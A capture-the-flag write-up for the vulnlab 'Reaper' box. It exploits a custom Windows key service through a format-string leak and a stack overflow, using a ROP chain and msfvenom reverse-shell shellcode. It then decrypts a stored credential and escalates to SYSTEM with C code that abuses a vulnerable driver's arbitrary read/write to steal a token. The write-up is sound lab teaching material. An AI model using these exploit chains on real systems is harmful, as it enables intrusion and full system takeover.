# vulnlab.com Reaper Writeup
macz & kozmer in 2023

![Title](/images/title.png)

Reaper is an insane binexp related box playable at https://www.vulnlab.com

## TOC
[user / foothold](#user--foothold)
- [recon](#recon)
  - [ftp](#ftp)
  - [service on port 4141](#service-on-port-4141)
- [dev_keysvc.exe analysis](#dev_keysvcexe-analysis)
- [binexp](#binexp)
  - [finding the bug(s)](#finding-the-bugs)
    - [stack overflow](#stack-overflow)
    - [we need a leak](#we-need-a-leak)
  - [obstacles, obstacles everywhere](#obstacles-obstacles-everywhere)
  - [rop chain knitting](#rop-chain-knitting)
  - [final exploit in action](#final-exploit-in-action)
- [shell as reaper\keysvc](#shell-as-reaperkeysvc)   

[privilege escalation](#privilege-escalation)
- [analysing the reaper.sys driver](#analyzing-the-reapersys-driver)
- [some notes on debug setup](#some-notes-on-debug-setup)
- [writing the exploit](#writing-the-exploit)
- [shell as nt authority\system](#shell-as-nt-authoritysystem)

[wrap-up](#wrap-up)
  
# User / Foothold
## Recon
After starting the machine in the vulnlab discord via the bot interface and waiting until its reachable over VPN, we run the initial port scans:

`rustscan --ulimit 5000 -g -a 10.10.74.149`  
`10.10.74.149 -> [21,80,3389,4141,5040]`  

The rustscan resulted in 5 ports being found, we will now check for any false positives that rustscan may have outputted and do service identification with nmap:

`nmap -sC -sV -p 21,80,3389,4141,5040 10.10.74.149`  

```
PORT     STATE SERVICE       REASON          VERSION

21/tcp   open  ftp           syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 08-15-23  12:12AM                  262 dev_keys.txt
|_08-14-23  02:53PM               187392 dev_keysvc.exe
| ftp-syst: 
|_  SYST: Windows_NT
...
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
...
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: REAPER
|   NetBIOS_Domain_Name: REAPER
|   NetBIOS_Computer_Name: REAPER
|   DNS_Domain_Name: reaper
|   DNS_Computer_Name: reaper
|   Product_Version: 10.0.19041
|_  System_Time: 2023-08-27T19:03:28+00:00
| ssl-cert: Subject: commonName=reaper
| Issuer: commonName=reaper
| Public Key type: rsa
| Public Key bits: 2048
...
4141/tcp open  oirtgsvc?     syn-ack ttl 127
| fingerprint-strings: 
|   GenericLines: 
|     Choose an option:
|     Activate key
|     Exit
...
5040/tcp open  unknown       syn-ack ttl 127
1 service unrecognized despite returning data. 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
...
Host script results:
|_clock-skew: -1s
```

So quick-checking the http server results in a default IIS page without any content, for the RDP, we have no credentials and 5040 does not have anything either. We are left with 2 ports to further investigate: FTP with some files which we will grab and also a custom looking service listening on port 4141.

### FTP

The anonymous FTP login allows us to download 2 files:

```
root@kali2:~/vulnlab/Reaper# ncftp 10.10.74.149
NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 10.10.74.149...
Microsoft FTP Service
Logging in...
User logged in.
Logged in to 10.10.74.149.
ncftp / > dir
----------   1 ftpuser  ftpusers          262 Aug 15 00:12 dev_keys.txt
----------   1 ftpuser  ftpusers       187392 Aug 14 14:53 dev_keysvc.exe
ncftp / > mget *
dev_keys.txt:                                          262.00 B   17.33 kB/s  
dev_keysvc.exe:                                        183.00 kB    2.37 MB/s  
ncftp / > exit

root@kali2:~/vulnlab/Reaper# cat dev_keys.txt 
Development Keys:

100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
102-FE9A1-500-A272-0106-UHJlbWl1bSBMaWNlbnNl

The dev keys cannot be activated yet, we are working on fixing a bug in the activation function.

root@kali2:~/vulnlab/Reaper# file dev_keysvc.exe 
dev_keysvc.exe: PE32+ executable (console) x86-64, for MS Windows
```

This looks (also regarding the filename) like a service for some kind of key management, which directly leads to the assumption, that the custom service we saw listening on port 4141 might be related to this.

### Service on port 4141

Connecting to this port shows us the following menu. Using a test key found in the FTP download confirms that this service is the binary we downloaded running on port 4141 as a network service:

```
nc 10.10.74.149 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==
Valid key format
Choose an option:
1. Set key
2. Activate key
3. Exit
2
Checking key: 100-FE9A1-500-A270-0102, Comment: Standard License
Could not find key!
Choose an option:
1. Set key
2. Activate key
3. Exit

```

Skipping further enumeration (which would not give anything else), we will start analysing the binary.
## dev_keysvc.exe analysis
Let’s fire up our beloved disassembler and check what is going on :-)

Starting with the main() function, after renaming the variables with meaningful names and making some comments, we see initial network service setup code, opening a socket, listening on port 4141 and upon a client connecting a thread is created to handle the client connection. we name this function "connection_handler()"

![main](/images/user_main.png)

There is nothing more to explore in main, so moving on to the connection_handler. the connection_handler is responsible for presenting the menu (we saw before on the netcat) to the user and process the user’s choices and input. also, we find a commented-out debug function, which is not used in the code but gives use some idea what is going on. 

![connection_handler](/images/user_connection_handler.png)

Option 3 is pretty clear, it just exits the network connection. So, we have to look into option 1 and 2. Option 1 (Set key) asks the user to enter a key, and then is performing a check on key integrity using a checksum (this happens inside check_key_with_checksum() function). Depending on the outcome it informs the user if the key is valid or not. Option 2 checks the previously entered key against a local file keys.txt, which follows the same format as the dev_keys.txt that we found on the ftp server and also decodes the 2nd part of the key which seems to be a comment.

![check_key_with_checksum](/images/user_check_key_with_checksum.png)

![check_key_with_file](/images/user_check_key_with_file.png)

Don't be surprised about the names of the functions or the code having nice names, if you start analysing the binary yourself it will look pretty different. Mainly the functions will have the default names your disassembler gives them. So, the readable code is the result of the reversing process, which takes some time of manually inspecting code blocks, making sense of them, giving the functions good names, running the code even in the debugger to verify if the static analysis was ok, and repeating this until the important core functions are identified and the bigger picture of what the code is doing is clear. This is a dynamic process of analysing, debugging, verifying and commenting.

## binexp
So, can we exploit this? What do we have and what do we need?
- We notice all the functions we analysed do not use any kind of stack protection (stack cookies), so a classic stack overflow would be possible if we find a short buffer somewhere, where we can send more data than which the buffer can hold.
- A quick check of the binary in x64dbg, the memory map shows us the stack is not executable (NX), so it would not be possible to directly run shellcode, but ROP would be an option.
- We also face a dynamic, position independent executable, which means if we want to use ROP, we would need a leak of the programs base address first in order to use ROP gadgets.

### finding the bug(s)
If this service is exploitable, we need to find a bug (or more than one). A good starting point would be the developers comment in the dev_keys.txt file "The dev keys cannot be activated yet; we are working on fixing a bug in the activation function". So, let’s maybe check this one first.

#### stack overflow
Inside the ``check_key_with_file()`` within option 2, we have "read keys from file and compare them to the given key" code. We can only influence the key we give to that function, by setting it in option 1. However, nothing will break here because it’s just comparing keys to our input. But there is also the ``checking_key_with_comment()`` function which does more processing on the user supplied key.

Valid keys look like: `100-FE9A1-500-A270-0102-U3RhbmRhcmQgTGljZW5zZQ==`  

![check_key_with_file](/images/user_checking_key_with_comment_v3.png)

This function uses a static(!) 0x88 byte local stack-based buffer for building the result string, which is a concatenation of the first part of the key and a base64 decode of the 2nd part of the key. 

`Checking key: <first part>, Comment: <base64 decoded part>`  

There is no check or limit for the size of the base64 decoded result, so by supplying arbitrary base64 encoded data as the 2nd key part we have a classic stack-based overflow. The code works also with supplied null bytes, so we have no bad chars here - profit. 

By encoding some long ascii pattern generated with pwntools cyclic() command and base64 encoding it after, we can provoke a crash in the debugger and verify our findings.

```
root@kali2:~/vulnlab/Reaper# nc 192.168.1.65 4141
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 100-FE9A1-500-A270-0102-YWFhYWJhYWFjYWFhZGFhYWVhYWFmYWFhZ2FhYWhhYWFpYWFhamFhYWthYWFsYWFhbWFhYW5hYWFvYWFhcGFhYXFhYWFyYWFhc2FhYXRhYWF1YWFhdmFhYXdhYWF4YWFheWFhYXphYWJiYWFiY2FhYmRhYWJlYWFiZmFhYmdhYWJoYWFiaWFhYmphYWJrYWFibGFhYm1h
Valid key format
Choose an option:
1. Set key
2. Activate key
3. Exit
2
```

results in an overflow inside ``checking_key_with_comment()`` - Screenshot shows a breakpoint sitting on the last ret of this function

![stackoverflow](/images/user_stack_overflow.png)

so now we can ROP ... not. We are still missing a leak for being able to use the gadgets with the correct program base address (remember we have position independent code).  

#### we need a leak

Finding this leak took me quite a while, maybe I was being blind or no clue. But having a program with basically two functions, it should be findable if it is somewhere at all. After playing around for a while I noticed that the key is ultimately mirrored back to the user by ``sprintf_s()`` function, which takes the supplied key without any modification, so we have an option for a standard format string bug (FSB) supplying ``printf`` format specifiers (like %x, %p...). the only caveat in our way is the checksum, which skips the key display, if it’s not correct. So, we can now either reverse the checksum code (Doesn't look too complicated summing up the letters) or just be lazy and fish the correct checksum right from the compare code at code offset ``0xcea`` in the debugger (I went for the 2nd way). Therefore using:
`%pX-FE9A1-500-A270-0194-U3RhbmRhcmQgTGljZW5zZQ==`  as the key to leak the address of the "Checking key: " string from data section, so we can calculate the program base. 

Kozmer found another way to leak the program base without having a valid checksum. You can just give it a valid key (One from ``dev_keys.txt``) and then activate it. Once that's done it’s possible to  set another key with just `%p` and activate to get the leak:
```
Choose an option:
1. Set key
2. Activate key
3. Exit
1
Enter a key: 101-FE9A1-550-A271-0109-UHJlbWl1bSBMaWNlbnNl
Valid key format
Choose an option:
1. Set key
2. Activate key
3. Exit

2
Checking key: 101-FE9A1-550-A271-0109, Comment: Premium License
Could not find key!

Choose an option:
1. Set key
2. Activate key
3. Exit

1
Enter a key: %p
Invalid key format

Choose an option:
1. Set key
2. Activate key
3. Exit

2
Checking key: 00007FF7B94C0660 <------- leak
, Comment:

Could not find key!
```

Moving forward. A partial pwntools script for leaking looks like this:

```python
log.info("leaking program base")
p.sendlineafter(b"Exit", b"1")
p.sendafter(b"Enter a key:", b"%pX-FE9A1-500-A270-0194-U3RhbmRhcmQgTGljZW5zZQ==")
p.sendlineafter(b"Exit", b"2")

p.readuntil(b"Checking key: ")
leak = int(p.readuntil(b"X", drop = True).decode(), 16)
pbase = leak - 0x20660
log.info("program base: " + hex(pbase))
```

### obstacles, obstacles everywhere
Now we have everything needed to start building a ropchain, which does something usable. This is the main step where I had to put a lot of time (which is normal if you do not have a ton of good rop gadgets), trying to build small chains to move values into registers and to find a strategy how to get a reverse shell or anything helping to compromise the box. Let’s list the obstacles we face:

- we can only use functions already present in the IAT (Import Address Table ), because we have no idea about exact OS version or ntdll base address leak available
- registers needed for windows api calling convention (rcx, rdx, r8, r9) are really hard to fill with the gadgets we can find in the binary
- communication is over a socket, so anything in and out needs to use the send() and recv() functions, which would need a leak of the socket handle (I saw no way to get this, and guessing it like in Linux is not an option here)

Normally in this case I would try to use ``VirtualProtect()`` to make the stack executable and then jump into some off-the-shelf-shellcode, but we do not have ``VirtualProtect()`` in our IAT, because the program does not use it. We can only find ``VirtualAlloc()`` and some WSA2 communication functions, stuff like ``memcpy`` but nothing real usable.

I was stalled in this place for quite a while, trying a ton of approaches, like allocating a RWX buffer with ``VirtualAlloc()`` and then loading shellcode with the recv() function into that buffer. but this was failing for many reasons (no gadgets to transfer/store values, no way getting the socket handle and much more). So, I looked for help discussing the problem with xct - he basically (nicely) told me to RTFM the windows API description for ``VirtualAlloc()`` again in depth. and yes, this made it click.

![va](/images/va.png)

this is windows being a strange thing sometimes. You can use ``VirtualAlloc()`` to modify existing memory protections, so we now have a plan:

Preparing the registers with the needed values to call ``VirtualAlloc()`` on our actual stack frame and then jump into the RWX changed stack to execute standard reverse-shell shellcode.

### rop chain knitting

I will spare you the process, which is sometimes really annoying (but somehow, I like this). Building small gadget chains to load registers or move around values without destroying stuff already accomplished. There is also no cookbook to follow, it’s like looking for smallest gadgets possible to get values into the needed registers, with satisfying the side conditions. I normally do this in ropper https://github.com/sashs/Ropper interactive mode. For example, if I want to fill rcx, I look for the simplest gadget pop rcx; ret. So, if this is available, we are lucky if not, we look for more complex gadgets, and then try to satisfy the needed conditions, which can be quite some levels of recursion, and in the worst case might not be solvable in the end. In my scratchpad I came up with the following gadgets, giving them some more descriptive shortcuts (not using all of them in the exploit):

```python
# Some gadgets
pop_rcx = 0x00000000000031dc            # pop rcx; clc; ret; 
pop_rax = 0x000000000000150a            # pop rax; ret; 
pop_r13 =  0x00000000000047b3           # pop r13; ret; 
mov_rdx_r13 = 0x000000000000368f        # mov rdx, r13; call rax; 
pop_rbx = 0x00000000000020d9            # pop rbx; ret; 
mov_r9_rbx = 0x0000000000001f90         # mov r9, rbx; mov r8, 0; add rsp, 8; ret; 
cmove_r9_rdx = 0x000000000001f37d       # cmove r9, rdx; mov rax, r9; ret; 
mov_r8_0 = 0x0000000000001f93           # mov r8, 0; add rsp, 8; ret; 
add_r8_r9 = 0x0000000000003918          # add r8, r9; add rax, r8; ret; 
pop_rsi = 0x0000000000004116            # pop rsi; ret; 
cmp_esi_0x6348ffff = 0x0000000000012ddb # cmp esi, 0x6348ffff; ret;
ret = 0x000000000001088a                # ret; 
mov_r15_rax = 0x0000000000014b02        # push rax; pop r15; ret; 
mov_qw_rcx_rax = 0x000000000000e1a0     # mov qword ptr [rcx + 8], rax; ret; 
jmp_qw_rcx = 0x000000000001e8a3         # jmp qword ptr [rcx];
jmp_qw_rbx = 0x000000000001ec79         # jmp qword ptr [rbx]; 
```

finding load rcx gadget in ropper:

![ropper](/images/user_ropper.png)

After many hours I came up with the following pwntools code to load rcx, rdx, r8 & r9 registers with the needed values and then call ``VirtualAlloc()`` on the stack memory address to make the stack RWX

```python
# IAT
VirtualAlloc = pbase + 0x20000

# register load rop chains

# destroys r9, rbx, rax
def load_r8(value):
 r = b""
 r += p64(pbase + mov_r8_0)
 r += p64(0xdeadbeefdeadbeef)
 r += p64(pbase + pop_rbx)
 r += p64(value)
 r += p64(pbase + mov_r9_rbx)
 r += p64(0xdeadbeefdeadbeef)
 r += p64(pbase + add_r8_r9)
 return r

# destroys rax, r13
def load_rdx(value):
 r = b""
 r += p64(pbase + pop_r13)
 r += p64(value)
 r += p64(pbase + pop_rax)
 r += p64(pbase + pop_rax) # fix call() in r13 gadget
 r += p64(pbase + mov_rdx_r13)
 return r

# destroys rdx, rsi, r13
def load_r9(value):
 r = b""
 r += p64(pbase + pop_rsi) # make cmove condition always work
 r += p64(0x6348ffff)
 r += p64(pbase + cmp_esi_0x6348ffff)
 r += load_rdx(value) # destroys rax, r13
 r += p64(pbase + cmove_r9_rdx)
 return r

# destroys rbx, rax
def rsp_to_rcx():
 r = b""
 r += p64(pbase + pop_rbx)
 r += p64(0)
 r += p64(pbase + 0x0000000000001fa0) # xor rbx, rsp; ret; 
 r += p64(pbase + 0x0000000000001fc2) # push rbx; pop rax; ret;
 r += p64(pbase + 0x0000000000001f80) # mov rcx, rax; ret; 
 return r

def load_rcx(value):
 r = b""
 r += p64(pbase + pop_rcx)
 r += p64(value)
 return r

# destroys rbx, r12, rsi
def jmp_IAT(address):
 r = b""
 r += p64(pbase + pop_rbx)
 r += p64(address)
 r += p64(pbase + jmp_qw_rbx)
 # fix stack after function call
 r += p64(pbase + 0x000000000000a99a) # pop rsi; pop r12; ret; 
 r += p64(0xdeadbeefdeadbeef)
 r += p64(0xdeadbeefdeadbeef)
 return r

# rop chain
rop = b""

# use VirtualAlloc as VirtualProtect to make Stack RWX
rop += load_r8(0x1000)  # flAllocationType -> only MEM_COMMIT
rop += load_r9(0x40)    # flProtect - RWX  -> PAGE_EXECUTE_READWRITE
rop += load_rdx(0x1000) # dwSize           -> one page
rop += rsp_to_rcx()     # lpAddress
rop += jmp_IAT(VirtualAlloc)
```

After running through this ropchain our actual stack page is now executable, all that is left to do now is to generate some shellcode (using msfvenom for example) and jmp right into it. 

```python
# Start shellcode
rop += p64(pbase + 0x000000000001becd) # push rsp; and al, 8; ret; 
rop += b"\x90" * 8 # some nops
rop += sc # shellcode from msfvenom
```

you can download the final exploit here: [exploit-user-final.py](/images/exploit-user-final.py) (will be published at a later time, as requested by xct)

### final exploit in action

```
root@kali2:~/vulnlab/Reaper# python3 exploit-user-final.py 
[*] generating shellcode, takes a bit
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of python file: 2210 bytes
Saved as: sc.py
[+] Opening connection to 10.10.74.149 on port 4141: Done
[*] leaking program base
[*] program base: 0x7ff6b28f0000
[*] building ropchain
[*] sending payload
[*] starting listener
[+] Trying to bind to :: on port 5555: Done
[+] Waiting for connections on :::5555: Got connection from ::ffff:10.10.74.149 on port 50405
[*] Switching to interactive mode
Microsoft Windows [Version 10.0.19045.3208]
(c) Microsoft Corporation. All rights reserved.

C:\keysvc>$ whoami
whoami
reaper\keysvc

C:\keysvc>$  
```

## shell as reaper\\keysvc
So, we made it onto the box :-) let’s look around a bit. We upload winpeas for enumeration to ``c:\\programdata`` and look for stuff which sticks out. I found two interesting things:
- a driver directory on c:\ with a definitely non-standard driver named reaper.sys :-)
- a PowerShell command history file

```
C:\ProgramData>$ powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\ProgramData> $ iwr 10.8.0.73/winPEASx64.exe -o winPEASx64.exe
PS C:\ProgramData> $ .\winPEASx64.exe

...
PS history file: C:\Users\keysvc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS history size: 156B
...

PS C:\ProgramData> $ type C:\Users\keysvc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
$credential = Get-Credential
$credential.Password | Convert-FromSecureString 
$credential.Password | ConvertFrom-SecureString | Set-Content automation.txt

PS C:\ProgramData> $ cd C:\users\keysvc

PS C:\users\keysvc> $ type automation.txt
01000000d08c9ddf0115d1118c7a00c04fc297eb01000000341bbb10d13d3e44aed494db4...
```

so, it seems the keysvc user stored some automation credential into the home folder in a file named automation.txt, this is nice, because we have a shell as keysvc so we can use the user’s own encryption keys to decrypt the stored credential

```
PS C:\users\keysvc> $ $secureObject = ConvertTo-SecureString -String 01000000d08c9ddf0115d1118c7a00c04fc297eb0...
PS C:\users\keysvc> $ $decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
PS C:\users\keysvc> $ $decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
PS C:\users\keysvc> $ $decrypted
<redacted>
```

and we got the password :-) remembering the open RDP port we will instantly try if this user is allowed to connect by RDP.

`xfreerdp /v:$box /u:keysvc /p:<redacted> /size:1400x1050`

and yes it works, we now have a nice working environment for the next step, which might be something related to the reaper.sys driver we found in ``c:\\driver``. If the software quality of the developers working on this box is the same, we might be lucky to find another bug in this driver’s code which will aid in escalating privileges.

# privilege escalation
Now finally having a RDP session, we can see that we are sitting on a Windows 2022 server as user keysvc. our next steps will be to analyse the driver and build us a debug environment matching the box as close as possible, so we can debug the driver locally with a kernel debugger.

## analysing the reaper.sys driver

The driver is pretty small, so we can skip all install/setup/loading code and focus on the driver functions. soon we find the handler function processing 3 different IOCTLs

```c
#define IOCTL_ALLOCATE      0x80002003
#define IOCTL_FREE          0x80002007
#define IOCTL_COPY_SRC_DST  0x8000200B
```

- IOCTL_ALLOCATE is a driver function which takes user data consisting of some static magic value, a thread priority value, thread id, src and destination address and writing this in some then fresh allocated memory structure
- IOCTL_FREE frees that previously allocated memory structure
- IOCTL_COPY_SRC_DST is the function which is doing the work. Using the data setup before with the IOCTL_ALLOCATE, it looks up the given thread, sets its priority and then copies a QWORD from the given src to dst address, which is arbitrary write into the kernel using this driver (We pretty much have a Write What Where primitive at this point). And related to the fact, Windows has no SMAP, an arbitrary kernel write is an arbitrary read at the same time, because we can write to userland supplied buffers for getting information from the kernel. 

This is the commented ``ioctl_handler`` function:
![kernel_driver](/images/kernel_driver.png)

Obviously we were lucky and got our kernel write served on a silver plate without too much hassle for doing stuff like abusing kernel heap or other advanced techniques. What's left to do is write code that interacts with the driver and abuses the IOCTL's at hand which we can leverage the arb read/write to for example steal some process token of the system process and copy it to our own process or get shellcode execution via more advanced techniques.

## some notes on debug setup

- Installed windows 2022 server into a VMware vm
- I am using classic windbg (not the preview) installed using the following setup guide https://www.triplefault.io/2017/07/setting-up-kernel-debugging-using.html

installing the driver for debugging inside the vm:
```
c:\driver>sc create Reaper binPath= c:\driver\reaper.sys type= kernel
[SC] CreateService SUCCESS

c:\driver>sc start Reaper

SERVICE_NAME: Reaper
        TYPE               : 1  KERNEL_DRIVER
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 0
        FLAGS              :
```

for this to work disable driver signing with start F8 / options... Or run with windbg attached

## writing the exploit
I do not have much experience writing windows kernel exploits, but lucky me, there is xct's kernel repo containing a lot of directly usable code for doing stuff like stealing tokens etc. (https://github.com/xct/windows-kernel-exploits)

The attack idea is to use our read/write primitive to find our own process in memory and copy the security token of the system process to our own process to get "nt system" level access.

The above repo has code doing exactly this in a function named ``GetCurrentEProcess()`` in HevdPoolOverflowWin7x64.cpp. (There are plenty of other online examples of token stealing)
However, for this to work we need to grab some offsets from the ``nt!_EPROCESS`` struct to adapt the code for our specific kernel version.

So, we break inside the windows kernel with windbg and collect those offsets
- ActiveProcessLinks_OFFSET 0x448
- PID_OFFSET 0x440
- TokenPtr_OFFSET 0x4b8

![windbg](/images/kernel_windbg.png)

The exploit’s main function is doing the outlined idea of copying the systems process security token:
```c

...
typedef struct reap  {
	DWORD magic; //0x6A55CC9E
	DWORD thread_id;
	DWORD priority;
	DWORD empty;
	QWORD src_address;
	QWORD dst_address;
} reap;
...

void Allocate(HANDLE hFile, reap *r)
{
	unsigned char obuf[1024];
	BOOL result;
	ULONG BytesReturned;

	memset(obuf, 0, sizeof(obuf));

	result = DeviceIoControl(hFile,
		IOCTL_ALLOCATE,
		(LPVOID)r,
		(DWORD)sizeof(struct reap),
		obuf,
		1024,
		&BytesReturned,
		NULL);
}

void Free(HANDLE hFile)
{
	unsigned char obuf[1024];
	BOOL result;
	ULONG BytesReturned;

	memset(obuf, 0, sizeof(obuf));

	result = DeviceIoControl(hFile,
		IOCTL_FREE,
		(LPVOID)NULL,
		(DWORD)0,
		obuf,
		1024,
		&BytesReturned,
		NULL);
}

void Copy(HANDLE hFile)
{
	unsigned char obuf[1024];
	BOOL result;
	ULONG BytesReturned;

	memset(obuf, 0, sizeof(obuf));

	result = DeviceIoControl(hFile,
		IOCTL_COPY_SRC_DST,
		(LPVOID)NULL,
		(DWORD)0,
		obuf,
		1024,
		&BytesReturned,
		NULL);
}

QWORD arbRead(QWORD where)
{
	reap ioctl;
	QWORD output;

	ioctl.magic = 0x6A55CC9E;
	ioctl.priority = 0; // THREAD_PRIORITY_NORMAL
	ioctl.thread_id = GetCurrentThreadId();
	ioctl.src_address = where;
	ioctl.dst_address = (QWORD)&output;

	Allocate(hFile, &ioctl);
	Copy(hFile);
	Free(hFile);

	return (output);
}


void arbWrite(QWORD dst, QWORD src)
{
	reap ioctl;

	ioctl.magic = 0x6A55CC9E;
	ioctl.priority = 0; // THREAD_PRIORITY_NORMAL
	ioctl.thread_id = GetCurrentThreadId();
	ioctl.src_address = src;
	ioctl.dst_address = dst;

	Allocate(hFile, &ioctl);
	Copy(hFile);
	Free(hFile);
}

typedef struct eProcResult {
	QWORD eProcess;
	QWORD tokenPtr;
	int pid;
} eProcResult;

...

void main(void)
{

  LPCSTR FileName = (LPCSTR)"\\\\.\\Reaper";

  printf("[+] Getting Device Driver Handle\n");
  printf("[+] Device Name: %s\n", FileName);

  hFile = GetDeviceHandle(FileName);
  if (hFile == INVALID_HANDLE_VALUE) {
    printf("\t[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
    exit(EXIT_FAILURE);
  }
  else {
    printf("[+] Device Handle: 0x%p\n", hFile);
  }

  eProcResult result = GetEProcessByPid(GetCurrentProcessId());
  eProcResult sysresult = GetEProcessByPid(4); // SYSTEM PID = 4

  // copy system token to our process
  printf("[+] copy system process token\n");
  arbWrite(result.eProcess + TokenPtr_OFFSET, sysresult.eProcess + TokenPtr_OFFSET);

  printf("[+] spawning command prompt\n\n");
    system("cmd.exe");

  if (hFile) CloseHandle(hFile);
}
```

After compiling the exploit and linking it statically (so there are no external dependencies), we upload it to the target box and run it using our RDP user from first step.

## shell as nt authority\\system

```
C:\users\keysvc\Desktop>.\reaper.exe
[+] Getting Device Driver Handle
[+] Device Name: \\.\Reaper
[+] Device Handle: 0x0000000000000050
[>] System _EPROCESS: 0xffff988588493040
[>] System Process: ffff98858ce0f080 (PID: 1772, TOKEN_PTR: ffffdc0edaec6066)
[>] System _EPROCESS: 0xffff988588493040
[>] System Process: ffff988588493040 (PID: 4, TOKEN_PTR: ffffdc0ed4e258d6)
[+] copy system process token
[+] spawning command prompt

Microsoft Windows [Version 10.0.20348.1906]
(c) Microsoft Corporation. All rights reserved.

C:\users\keysvc\Desktop>whoami
nt authority\system
``` 

Now, being system, we can read the flag from the administrator’s desktop folder :-)

You can download the final exploit here: [exploit-kernel.c](/images/exploit-kernel.c) (will be published at a later time, as requested by xct)

It is also probably worth mentioning that there isn't one set way of gaining system from this Write What Where primitive, the approach to token stealing is just one of many methods of gaining higher privileges. However, this comes with further annoyances such as bypassing SMEP/NX or even potentially kCFG.. With this being a [data-only attack](https://improsec.com/tech-blog/data-only-attacks-are-still-alive), we avoid many of these protections in place.

# wrap-up

In general, binary exploitation/pwn is nothing you can learn by following a guide. It’s different every time, which makes it also a bit harder to learn. but here (as for many skills you can acquire) its valid to say, start small, with an easy task, read writeups, try to follow their steps. when you managed to solve the easy task, look for the next a bit harder, repeat. 

Personally, I think one learns best with DOING stuff not only reading (doing > reading) and to peek into the writeup only if you get really stuck for a long time. This is how you learn to find your own way, which suites you best. and over time you gain experience which helps to conquer new bigger tasks.

-- macz
